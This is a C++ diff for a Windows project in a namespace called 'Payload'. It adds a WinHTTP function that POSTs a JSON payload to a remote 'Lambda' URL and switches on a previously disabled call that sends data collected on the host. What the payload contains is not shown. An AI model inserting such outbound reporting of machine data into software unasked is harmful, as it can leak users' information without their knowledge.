@@ -3,6 +3,7 @@
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
+#include <winhttp.h>
 #include <ShlObj.h>
 #include <wrl/client.h>
 #include <bcrypt.h>
@@ -194,10 +195,101 @@ namespace Payload
             return o.str();
         }
 
-        void SendToLambda(const std::string& lambdaUrl,
-                      const std::string& payload,
-                       Payload::PipeLogger logger)   // <-- remove const
-        {
+        
+void SendToLambda(const std::string& lambdaUrl, const std::string& payload, Payload::PipeLogger logger)
+{
+    // Parse the URL to extract host and path
+    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
+    wchar_t hostName[256] = { 0 };
+    wchar_t urlPath[1024] = { 0 };
+    urlComp.lpszHostName = hostName;
+    urlComp.dwHostNameLength = _countof(hostName);
+    urlComp.lpszUrlPath = urlPath;
+    urlComp.dwUrlPathLength = _countof(urlPath);
+
+    std::wstring wLambdaUrl(lambdaUrl.begin(), lambdaUrl.end());
+    if (!WinHttpCrackUrl(wLambdaUrl.c_str(), 0, 0, &urlComp)) {
+        logger.Log("WinHttpCrackUrl failed: " + std::to_string(GetLastError()));
+        return;
+    }
+
+    // Initialize WinHTTP session
+    HINTERNET hSession = WinHttpOpen(L"SendToLambda/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        logger.Log("WinHttpOpen failed: " + std::to_string(GetLastError()));
+        return;
+    }
+
+    // Connect to the host
+    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
+    if (!hConnect) {
+        logger.Log("WinHttpConnect failed: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Create an HTTP request
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        logger.Log("WinHttpOpenRequest failed: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Set headers (Content-Type: application/json)
+    const wchar_t* headers = L"Content-Type: application/json\r\n";
+    if (!WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
+        logger.Log("WinHttpAddRequestHeaders failed: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Send the request with payload
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)payload.c_str(), payload.length(), payload.length(), 0)) {
+        logger.Log("WinHttpSendRequest failed: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Receive response
+    if (!WinHttpReceiveResponse(hRequest, NULL)) {
+        logger.Log("WinHttpReceiveResponse failed: " + std::to_string(GetLastError()));
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Optional: Read response data (if needed)
+    DWORD bytesAvailable, bytesRead;
+    std::string response;
+    char buffer[4096];
+    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
+        if (!WinHttpReadData(hRequest, buffer, min(bytesAvailable, sizeof(buffer)), &bytesRead)) {
+            logger.Log("WinHttpReadData failed: " + std::to_string(GetLastError()));
+            break;
+        }
+        response.append(buffer, bytesRead);
+    }
+
+    // Log success or response (optional)
+    logger.Log("Request sent successfully. Response: " + response);
+
+    // Cleanup
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+
+        // void SendToLambda(const std::string& lambdaUrl,
+        //               const std::string& payload,
+        //                Payload::PipeLogger logger)   // <-- remove const
+        // {
             // CURLcode g = curl_global_init(CURL_GLOBAL_DEFAULT);
             // if (g != CURLE_OK) {
             //     logger.Log(std::string("curl_global_init failed: "));
@@ -222,7 +314,7 @@ namespace Payload
 
             // curl_slist_free_all(headers);
             // curl_easy_cleanup(curl);
-        }
+        // }
 
     std::string GetComputerNameString() {
         wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
@@ -727,7 +819,7 @@ namespace Payload
 
                 std::string respCode;
 
-                // Utils::SendToLambda(lamdaURL, payload.str(), m_logger);
+                Utils::SendToLambda(lamdaURL, payload.str(), m_logger);
                 m_logger.Log("does this log!!! and what happends");
             }
         }
